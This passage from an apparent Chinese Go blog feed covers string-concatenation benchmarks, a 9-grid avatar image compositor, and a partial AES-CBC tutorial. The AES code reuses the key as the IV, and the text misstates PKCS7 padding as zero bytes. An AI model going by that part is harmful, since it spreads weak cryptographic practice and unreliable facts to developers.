80 B&#x2F;op     1 allocs&#x2F;op<br>虽然每次操作内存分配只有1次，分配80字节也不多，但是每次操作耗时太长，性能远没有+号操作快。</p><p>Join 拼接<br>这个是利用strings.Join函数进行拼接，接受一个字符串数组，转换为一个拼接好的字符串。</p><pre class="line-numbers language-none"><code class="language-none">func StringJoin() string&#123;    s:&#x3D;[]string&#123;&quot;昵称&quot;,&quot;:&quot;,&quot;飞雪无情&quot;,&quot;\n&quot;,&quot;博客&quot;,&quot;:&quot;,&quot;http:&#x2F;&#x2F;www.flysnow.org&#x2F;&quot;,&quot;\n&quot;,&quot;微信公众号&quot;,&quot;:&quot;,&quot;flysnow_org&quot;&#125;    return strings.Join(s,&quot;&quot;)&#125;func BenchmarkStringJoin(b *testing.B) &#123;    for i:&#x3D;0;i&lt;b.N;i++&#123;        StringJoin()    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了方便，把性能测试的代码放一起了，现在看看性能测试的效果。</p><p>BenchmarkStringJoin-8   10000000    177 ns&#x2F;op   160 B&#x2F;op    2 allocs&#x2F;op<br>整体和+操作相差不了太多，大概低0.5倍的样子。</p><p><a href="http://www.flysnow.org/2018/10/28/golang-concat-strings-performance-analysis.html">http://www.flysnow.org/2018/10/28/golang-concat-strings-performance-analysis.html</a></p><p>Go语言字符串高效拼接（一） | 飞雪无情的博客</p><p>buffer 拼接<br>这种被用的也很多，使用的是bytes.Buffer进行的字符串拼接，它是非常灵活的一个结构体，不止可以拼接字符串，还是可以byte,rune等，并且实现了io.Writer接口，写入也非常方便。</p><pre class="line-numbers language-none"><code class="language-none">func StringBuffer() string &#123;    var b bytes.Buffer    b.WriteString(&quot;昵称&quot;)    b.WriteString(&quot;:&quot;)    b.WriteString(&quot;飞雪无情&quot;)    b.WriteString(&quot;\n&quot;)    b.WriteString(&quot;博客&quot;)    b.WriteString(&quot;:&quot;)    b.WriteString(&quot;http:&#x2F;&#x2F;www.flysnow.org&#x2F;&quot;)    b.WriteString(&quot;\n&quot;)    b.WriteString(&quot;微信公众号&quot;)    b.WriteString(&quot;:&quot;)    b.WriteString(&quot;flysnow_org&quot;)    return b.String()&#125;func BenchmarkStringBuffer(b *testing.B) &#123;    for i:&#x3D;0;i&lt;b.N;i++&#123;        StringBuffer()    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看他的性能，运行输出即可：</p><p>BenchmarkStringBuffer-8     5000000     291 ns&#x2F;op   336 B&#x2F;op    3 allocs&#x2F;op<br>好像并不是太好,和最差的fmt拼接差不多，和+号，Join拼接差好远，内存分配也比较多。每次操作耗时也很长。</p><p>builder 拼接<br>为了改进buffer拼接的性能，从go 1.10 版本开始，增加了一个builder类型，用于提升字符串拼接的性能。它的使用和buffer几乎一样。</p><pre class="line-numbers language-none"><code class="language-none">func StringBuilder() string &#123;    var b strings.Builder    b.WriteString(&quot;昵称&quot;)    b.WriteString(&quot;:&quot;)    b.WriteString(&quot;飞雪无情&quot;)    b.WriteString(&quot;\n&quot;)    b.WriteString(&quot;博客&quot;)    b.WriteString(&quot;:&quot;)    b.WriteString(&quot;http:&#x2F;&#x2F;www.flysnow.org&#x2F;&quot;)    b.WriteString(&quot;\n&quot;)    b.WriteString(&quot;微信公众号&quot;)    b.WriteString(&quot;:&quot;)    b.WriteString(&quot;flysnow_org&quot;)    return b.String()&#125;func BenchmarkStringBuilder(b *testing.B) &#123;    for i:&#x3D;0;i&lt;b.N;i++&#123;        StringBuilder()    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方都说比buffer性能好了，我们看看性能测试的结果。</p><p>BenchmarkStringBuilder-8    10000000    170 ns&#x2F;op   232 B&#x2F;op    4 allocs&#x2F;op<br>的确提升了，提升了一倍，虽然每次分配的内存次数有点多，但是每次分配的内存大小比buffer要少。</p><p>性能对比<br>以上就是常用的字符串拼接的方式，现在我们把这些测试结果，汇总到一起，对比下看看,因为Benchmark的测试，对于性能只显示，我把测试的时间设置为3s（秒），把时间拉长便于对比测试，同时生成了cpu profile文件，用于性能分析。</p><p>运行go test -bench&#x3D;. -benchmem -benchtime&#x3D;3s -cpuprofile&#x3D;profile.out得到如下测试结果：</p><pre class="line-numbers language-none"><code class="language-none">StringPlus-8    50000000    112 ns&#x2F;op   144 B&#x2F;op    2 allocs&#x2F;opStringFmt-8     20000000    344 ns&#x2F;op   80 B&#x2F;op     1 allocs&#x2F;opStringJoin-8    30000000    171 ns&#x2F;op   160 B&#x2F;op    2 allocs&#x2F;opStringBuffer-8  20000000    302 ns&#x2F;op   336 B&#x2F;op    3 allocs&#x2F;opStringBuilder-8 30000000    171 ns&#x2F;op   232 B&#x2F;op    4 allocs&#x2F;op<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过go tool pprof profile.out 看下我们输出的cpu profile信息。这里主要使用top命令。</p><pre class="line-numbers language-none"><code class="language-none">Showing top 15 nodes out of 89      flat  flat%   sum%        cum   cum%    11.99s 42.55% 42.55%     11.99s 42.55%  runtime.kevent     6.30s 22.36% 64.90%      6.30s 22.36%  runtime.pthread_cond_wait     1.65s  5.86% 70.76%      1.65s  5.86%  runtime.pthread_cond_signal     1.11s  3.94% 74.70%      1.11s  3.94%  runtime.usleep     1.10s  3.90% 78.60%      1.10s  3.90%  runtime.pthread_cond_timedwait_relative_np     0.58s  2.06% 80.66%      0.62s  2.20%  runtime.wbBufFlush1     0.51s  1.81% 82.47%      0.51s  1.81%  runtime.memmove     0.44s  1.56% 84.03%      1.81s  6.42%  fmt.(*pp).printArg     0.39s  1.38% 85.42%      2.36s  8.37%  fmt.(*pp).doPrint     0.36s  1.28% 86.69%      0.70s  2.48%  fmt.(*buffer).WriteString (inline)     0.34s  1.21% 87.90%      0.93s  3.30%  runtime.mallocgc     0.20s  0.71% 88.61%      1.20s  4.26%  fmt.(*fmt).fmtS     0.18s  0.64% 89.25%      0.18s  0.64%  fmt.(*fmt).truncate     0.16s  0.57% 89.82%      0.16s  0.57%  runtime.memclrNoHeapPointers     0.15s  0.53% 90.35%      1.35s  4.79%  fmt.(*pp).fmtString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前15个，可以看到fmt拼接的方式是最差的，因为fmt里很多方法耗时排在了最前面。buffer的WriteString方法也比较耗时。</p><p>以上的TOP可能还不是太直观，如果大家看火焰图的话，就会更清晰。性能最好的是+号拼接、Join拼接，最慢的是fmt拼接，这里的builder和buffer拼接差不多，并没有发挥出其能力。</p><p>总结<br>从整个性能的测试和分析来看，我们期待的builder并没有发挥出来，这是不是意味着builder不实用了呢？还不如+号和Join拼接呢？我们下一篇继续接着分析，这里提前透漏一些：比如:</p><p>拼接的字符串大小<br>拼接的字符串数量<br>以上这两个很关键，可以看下我上面的例子是属于哪一种。</p><p>好了，更深入具体的，请看下一篇字符串拼接分析。</p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-9宫格头像生成</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-9%E5%AE%AB%E6%A0%BC%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-9%E5%AE%AB%E6%A0%BC%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h3 id="先看效果"><a href="#先看效果" class="headerlink" title="先看效果"></a>先看效果</h3><ul><li>头像间有间隔<br> <img src="https://img-blog.csdnimg.cn/20200303144245619.png" alt="在这里插入图片描述"></li><li>头像间无间隔<br> <img src="https://img-blog.csdnimg.cn/20200303144310558.png" alt="在这里插入图片描述"></li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ol><li><p>网络图片下载到本地</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">multiGetImages</span><span class="token punctuation">(</span>urls <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> dir <span class="token builtin">string</span><span class="token punctuation">,</span> prefix <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">(</span>localPath <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">var</span> w <span class="token operator">=</span> sync<span class="token punctuation">.</span>WaitGroup<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> w<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">)</span> timestamp <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">UnixNano</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> url <span class="token operator">:=</span><span class="token keyword">range</span> urls <span class="token punctuation">&#123;</span>     name <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s/%s_%d_%d.png"</span><span class="token punctuation">,</span> dir<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> i<span class="token punctuation">)</span>     localPath <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>localPath<span class="token punctuation">,</span> name<span class="token punctuation">)</span>     <span class="token keyword">go</span> <span class="token function">downloadImage</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> w<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">downloadImage</span><span class="token punctuation">(</span>url <span class="token builtin">string</span><span class="token punctuation">,</span> imgName <span class="token builtin">string</span><span class="token punctuation">,</span> wg <span class="token operator">*</span>sync<span class="token punctuation">.</span>WaitGroup<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> out<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>imgName<span class="token punctuation">)</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token punctuation">&#125;</span> <span class="token keyword">defer</span> out<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> client <span class="token operator">:=</span> http<span class="token punctuation">.</span>Client<span class="token punctuation">&#123;</span>Timeout<span class="token punctuation">:</span> <span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">&#125;</span> resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token punctuation">&#125;</span> <span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> pix<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token punctuation">&#125;</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> bytes<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>pix<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>图片拼接</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">imageCompose</span><span class="token punctuation">(</span>imagePath <span class="token builtin">string</span><span class="token punctuation">,</span> localPaths <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> gap <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> imageSize <span class="token operator">:=</span> <span class="token number">80</span> imageRow <span class="token operator">:=</span> <span class="token function">int</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span><span class="token function">Sqrt</span><span class="token punctuation">(</span><span class="token function">float64</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>localPaths<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 根据传入图片数量判断行列数量</span> imageCol <span class="token operator">:=</span> imageRow rowOffset <span class="token operator">:=</span> gap colOffset <span class="token operator">:=</span> gap backImg <span class="token operator">:=</span> imaging<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span>imageSize<span class="token operator">*</span>imageRow<span class="token operator">+</span>gap<span class="token operator">*</span><span class="token punctuation">(</span>imageCol<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> imageSize<span class="token operator">*</span>imageCol<span class="token operator">+</span>gap<span class="token operator">*</span><span class="token punctuation">(</span>imageRow<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> color<span class="token punctuation">.</span>NRGBA<span class="token punctuation">&#123;</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> tempRow<span class="token punctuation">,</span> tempCol <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token keyword">for</span> tempRow <span class="token operator">&lt;</span> imageRow<span class="token operator">+</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">for</span> tempCol <span class="token operator">&lt;</span> imageCol<span class="token operator">+</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>         imgIndex <span class="token operator">:=</span> imageCol<span class="token operator">*</span><span class="token punctuation">(</span>tempRow<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> tempCol <span class="token operator">-</span> <span class="token number">1</span>         resizeImg<span class="token punctuation">,</span> err <span class="token operator">:=</span> imaging<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>localPaths<span class="token punctuation">[</span>imgIndex<span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>             fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>         <span class="token punctuation">&#125;</span>         resizeImg <span class="token operator">=</span> imaging<span class="token punctuation">.</span><span class="token function">Blur</span><span class="token punctuation">(</span>imaging<span class="token punctuation">.</span><span class="token function">Resize</span><span class="token punctuation">(</span>resizeImg<span class="token punctuation">,</span> imageSize<span class="token punctuation">,</span> imageSize<span class="token punctuation">,</span> imaging<span class="token punctuation">.</span>Lanczos<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 加了模糊操作</span>         backImg <span class="token operator">=</span> imaging<span class="token punctuation">.</span><span class="token function">Paste</span><span class="token punctuation">(</span>backImg<span class="token punctuation">,</span> resizeImg<span class="token punctuation">,</span> image<span class="token punctuation">.</span><span class="token function">Pt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>tempCol<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>imageSize<span class="token operator">+</span>colOffset<span class="token punctuation">,</span> <span class="token punctuation">(</span>tempRow<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>imageSize<span class="token operator">+</span>rowOffset<span class="token punctuation">)</span><span class="token punctuation">)</span>         tempCol <span class="token operator">+=</span> <span class="token number">1</span>         colOffset <span class="token operator">+=</span> gap     <span class="token punctuation">&#125;</span>     tempRow <span class="token operator">+=</span> <span class="token number">1</span>     rowOffset <span class="token operator">+=</span> gap     tempCol <span class="token operator">=</span> <span class="token number">1</span>     colOffset <span class="token operator">=</span> gap <span class="token punctuation">&#125;</span> err <span class="token operator">:=</span> imaging<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span>backImg<span class="token punctuation">,</span> imagePath<span class="token punctuation">)</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>删除临时图片</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">removeFile</span><span class="token punctuation">(</span>filePaths <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span>url <span class="token operator">:=</span> <span class="token keyword">range</span> filePaths<span class="token punctuation">&#123;</span>     err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">RemoveAll</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>         fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 图片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你的AES加密结果相同吗</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-%E4%BD%A0%E7%9A%84AES%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C%E7%9B%B8%E5%90%8C%E5%90%97/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-%E4%BD%A0%E7%9A%84AES%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C%E7%9B%B8%E5%90%8C%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h2 id="AES加密后的结果，数据接收方解不出来，是哪里的问题？"><a href="#AES加密后的结果，数据接收方解不出来，是哪里的问题？" class="headerlink" title="AES加密后的结果，数据接收方解不出来，是哪里的问题？"></a>AES加密后的结果，数据接收方解不出来，是哪里的问题？</h2><h4 id="AES的安全性："><a href="#AES的安全性：" class="headerlink" title="AES的安全性："></a>AES的安全性：</h4><blockquote><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>的意义上，只要存在一个方法，比<a href="https://zh.wikipedia.org/wiki/%E8%9B%AE%E5%8A%9B%E6%94%BB%E5%87%BB">穷举法</a>还要更有效率，就能被视为一种“破解”。故一个针对AES 128位密钥的攻击若“只”需要2^120^计算复杂度（少于穷举法　2^128^），128位密钥的AES就算被破解了。从应用的角度来看，这种程度的破解依然太不切实际。</p></blockquote><h4 id="AES加密方式有五种："><a href="#AES加密方式有五种：" class="headerlink" title="AES加密方式有五种："></a>AES加密方式有五种：</h4><ul><li><p>**电码本模式（Electronic Codebook Book (ECB)**，将整个明文分成若干段相同的小段，然后对每一小段进行加密。</p></li><li><p><strong>密码分组链接模式（Cipher Block Chaining (CBC)）</strong>，先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。</p><p>优点：能掩盖明文结构信息，保证相同密文可得不同明文，所以不容易主动攻击，安全性好于ECB，适合传输长度长的报文，是SSL和IPSec的标准。</p><p>缺点：（1）不利于并行计算；（2）传递误差——前一个出错则后续全错；（3）第一个明文块需要与一个初始化向量IV进行抑或，初始化向量IV的选取比较复杂。</p><p>初始化IV的选取方式：固定IV，计数器IV，随机IV（只能得到伪随机数，用的最多），瞬时IV（难以得到瞬时值）</p></li><li><p><strong>计算器模式（Counter (CTR)）</strong>, 完全的流模式。将瞬时值与计数器连接起来，然后对此进行加密产生密钥流的一个密钥块，再进行XOR操作 。</p></li><li><p><strong>密码反馈模式（Cipher FeedBack (CFB)）</strong></p></li><li><p><strong>输出反馈模式（Output FeedBack (OFB)）</strong>,密码算法的输出（指密码key而不是密文）会反馈到密码算法的输入中，OFB模式并不是通过密码算法对明文直接加密，而是通过将明文分组和密码算法的输出进行XOR来产生密文分组。</p></li></ul><h4 id="密钥长度三种："><a href="#密钥长度三种：" class="headerlink" title="密钥长度三种："></a>密钥长度三种：</h4><p>​密钥越长，安全强度越高，运算开销就会越大。</p><ul><li>AES-128：16byte</li><li>AES-192：24byte</li><li>AES-256：32byte</li></ul><h4 id="Padding："><a href="#Padding：" class="headerlink" title="Padding："></a>Padding：</h4><ul><li>PKCS5：PKCS5是指分组数据缺少几个字节，就在数据的末尾填充几个字节的几，比如缺少5个字节，就在末尾填充5个字节的5。</li><li>PKCS7：PKCS7是指分组数据缺少几个字节，就在数据的末尾填充几个字节的0，比如缺少7个字节，就在末尾填充7个字节的0。</li><li>NOPADDING：指不需要填充，也就是说数据的发送方肯定会保证最后一段数据也正好是16个字节。</li></ul><h4 id="实际使用中要注意的地方"><a href="#实际使用中要注意的地方" class="headerlink" title="实际使用中要注意的地方"></a>实际使用中要注意的地方</h4><ol><li>密钥、初始向量相同。</li><li>加密模式相同。</li><li>Padding模式相同。</li></ol><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">aesEncrypt</span><span class="token punctuation">(</span>orig <span class="token builtin">string</span><span class="token punctuation">,</span> key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 转成字节数组</span>    origData <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>orig<span class="token punctuation">)</span>    k <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token comment">// 分组秘钥</span>    block<span class="token punctuation">,</span> err <span class="token operator">:=</span> aes<span class="token punctuation">.</span><span class="token function">NewCipher</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        <span class="token function">panic</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"key 长度必须 16/24/32长度: %s"</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取秘钥块的长度</span>    blockSize <span class="token operator">:=</span> block<span class="token punctuation">.</span><span class="token function">BlockSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 补全码</span>    origData <span class="token operator">=</span> <span class="token function">PKCS7Padding</span><span class="token punctuation">(</span>origData<span class="token punctuation">,</span> blockSize<span class="token punctuation">)</span>    <span class="token comment">// 加密模式</span>    blockMode <span class="token operator">:=</span> cipher<span class="token punctuation">.</span><span class="token function">NewCBCEncrypter</span><span class="token punctuation">(</span>block<span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token punctuation">:</span>blockSize<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">// 创建数组</span>    cryted <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>origData<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">// 加密</span>    blockMode<span class="token punctuation">.</span><span class="token function">CryptBlocks</span><span class="token punctuation">(</span>cryted<span class="token punctuation">,</span> origData<span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>RawURLEncoding<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>cryted<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">aesDecrypt</span><span class="token punctuation">(</span>cryted <span class="token builtin">string</span><span class="token punctuation">,</span> key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    crytedByte<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> base64<span class="token punctuation">.</span>RawURLEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>cryted<span class="token punctuation">)</span>    k <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token comment">// 分组秘钥</span>    block<span class="token punctuation">,</span> err <span class="token operator">:=</span> aes<span class="token punctuation">.</span><span class="token function">NewCipher</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        <span class="token function">panic</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"key 长度必须 16/24/32长度: %s"</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取秘钥块的长度</span>    blockSize <span class="token operator">:=</span> block<span class="token punctuation">.</span><span class="token function">BlockSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 加密模式</span>    blockMode <span class="token operator">:=</span> cipher<span class="token punctuation">.</span><span class="token function">NewCBCDecrypter</span><span class="token punctuation">(</span>block<span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token punctuation">:</span>blockSize<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">// 创建数组</span>    orig <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>crytedByte<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">// 解密</span>    blockMode<span class="token punctuation">.</span><span class="token function">CryptBlocks</span><span class="token punctuation">(</span>orig<span class="token punctuation">,</span> crytedByte<span class="token 